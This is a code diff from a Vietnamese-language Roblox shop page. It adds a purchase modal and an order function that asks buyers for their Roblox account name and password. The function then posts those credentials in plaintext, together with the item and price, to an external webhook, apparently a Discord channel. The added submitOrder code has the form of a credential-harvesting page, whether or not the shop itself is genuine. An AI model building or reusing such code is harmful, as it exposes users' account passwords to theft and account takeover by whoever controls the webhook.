+            document.getElementById('card-pin').value = ''; document.getElementById('card-seri').value = '';
         }
 
-        render('fruit');
+        function openBuy(name, price) {
+            picking = { name, price };
+            document.getElementById('m-name').innerText = name;
+            document.getElementById('m-price').innerText = price.toLocaleString() + " VNĐ";
+            document.getElementById('buy-modal').classList.remove('hidden');
+        }
+
+        function submitOrder() {
+            const acc = document.getElementById('rb-acc').value, pass = document.getElementById('rb-pass').value, note = document.getElementById('rb-note').value;
+            if(!acc || !pass) return alert("Không được bỏ trống tài khoản/mật khẩu!");
+
+            const content = `🚀 **ĐƠN HÀNG MỚI ĐÃ VỀ!**\n` +
+                            `──────────────────\n` +
+                            `📦 Dịch vụ: **${picking.name}**\n` +
+                            `💰 Giá: **${picking.price.toLocaleString()}đ**\n` +
+                            `👤 TK Roblox: \`${acc}\`\n` +
+                            `🔑 MK Roblox: \`${pass}\`\n` +
+                            `📝 Ghi chú: *${note || "Không có"}*\n` +
+                            `──────────────────`;
+            
+            fetch(WEBHOOK_URL, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({ content }) });
+            alert("Đã đặt hàng thành công! Nghĩa sẽ xử lý ngay.");
+            closeModal();
+        }
+
+        function closeModal() { document.getElementById('buy-modal').classList.add('hidden'); }
+        
+        // Khởi tạo shop
+        renderShop('fruit');
     </script>
 </body>
 </html>
